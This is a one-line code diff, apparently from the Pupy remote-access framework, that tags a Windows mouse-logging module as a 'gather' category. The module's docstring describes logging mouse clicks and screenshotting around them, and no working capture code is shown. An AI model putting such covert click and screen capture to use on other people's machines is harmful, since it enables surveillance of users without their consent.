@@ -21,6 +21,7 @@ def pil_save(filename, pixels, width, height):
 __class_name__="MouseLoggerModule"
 
 @compatibility("windows")
+@category("gather")
 class MouseLoggerModule(PupyModule):
 	""" log mouse clicks and take screenshots of areas around it """
 	# WARNING : screenshots are kept in memory before beeing dumped
